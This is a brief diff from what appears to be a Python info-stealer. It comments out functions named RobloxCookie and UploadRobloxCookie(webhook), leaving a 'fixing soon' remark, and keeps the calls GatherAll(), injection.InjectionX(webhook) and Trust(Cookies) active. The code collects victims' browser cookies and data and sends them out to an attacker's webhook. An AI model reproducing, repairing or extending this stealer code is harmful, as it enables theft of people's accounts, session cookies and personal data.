@@ -900,8 +900,8 @@ GamingZip = []
 OtherZip = []
 
 GatherAll()
-RobloxCookie() # Fixing this shit soon
-UploadRobloxCookie(webhook) # Fixing this shit soon
+# RobloxCookie(path, arg) # Fixing this shit soon
+# UploadRobloxCookie(webhook) # Fixing this shit soon
 injection.InjectionX(webhook)
 DETECTED = Trust(Cookies)
 DETECTED = False
